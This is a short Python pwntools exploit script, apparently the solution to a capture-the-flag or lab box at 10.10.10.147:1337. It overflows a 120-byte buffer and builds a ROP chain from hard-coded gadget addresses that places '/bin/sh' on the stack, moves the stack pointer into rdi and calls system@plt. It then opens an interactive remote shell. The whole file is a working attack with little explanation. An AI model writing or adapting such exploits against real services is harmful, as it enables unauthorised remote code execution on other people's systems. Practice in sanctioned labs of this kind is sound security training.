#!/usr/bin/env python2
# -*- encoding:utf-8 -*-

from pwn import *

#context(os="linux", arch="amd64")
# context.terminal = ['konsole', '-e']
# context.log_level = 'DEBUG'

r = remote('10.10.10.147', '1337')
# e = ELF('./myapp')
# r = gdb.debug('./myapp')

# Found offset: 120
junk1 = "\x90" * 120
junk2 = "\x90" * 16
shtext = "/bin/sh\x00"  # just 8 bytes.
r.recvuntil("average")
r.recvuntil("\n")

plt_system = p64(0x401040)
plt_main = p64(0x40115f)
pop_r131415_ret = p64(0x401206)  # pop the shtext inside stack, then fill others with nop
mov_rsp_to_rdi = p64(0x401156)  # followed with a jmp r13

payload = junk1 + pop_r131415_ret + plt_system + junk2 + mov_rsp_to_rdi + shtext + plt_main

r.send(payload)
r.interactive()
